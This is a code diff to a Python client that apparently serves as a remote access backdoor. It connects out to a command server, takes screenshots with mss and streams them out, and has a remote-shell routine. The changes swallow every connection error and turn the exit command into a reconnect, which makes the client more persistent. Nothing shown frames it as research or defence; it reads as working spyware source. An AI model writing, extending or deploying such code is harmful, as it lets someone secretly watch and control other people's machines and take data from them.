@@ -6,26 +6,23 @@ import subprocess
 import mss
 
 
-ip = ""
-port = 0
+address = ("0.0.0.0", 3000)
 
 def take_screen_shot():
-    file_con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    file_con.connect(("0.0.0.0", 3001))
-    
-    
+
     if len(mss.mss().monitors) > 0:
         raw_pixels = mss.mss().grab(mss.mss().monitors[0])
         img_data = mss.tools.to_png(raw_pixels.rgb, raw_pixels.size, 0)
         file_size = str(len(img_data)) + "\n"
-        file_con.send(file_size.encode())
+        server_con.send(file_size.encode())
 
-    
-        file_con.sendall(img_data)
-        file_con.shutdown(socket.SHUT_WR)
+
+        server_con.sendall(img_data)
+
         del(raw_pixels, img_data)
-        
-    file_con.close()
+
+def send_file(file_path):
+    pass
 
 def open_shell():
     while True:
@@ -65,15 +62,14 @@ def establish_connection(address):
             server_con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             server_con.connect((address[0],address[1]))
             print(f"Connected!\nServer: {address[0]}:{address[1]}")
-        except ConnectionRefusedError:
+        except:
             time.sleep(1)
         else:
             break
 
 
 def main():
-    ip, port = "0.0.0.0", 3000 #address[0], int(address[1])
-    establish_connection((ip,port))
+    establish_connection(address)
 
     while True:
         choice = server_con.recv(1024).decode()
@@ -84,7 +80,7 @@ def main():
             take_screen_shot()
         elif choice == "6":
             server_con.close()
-            sys.exit()
+            establish_connection(address)
 
     server_con.close()
 
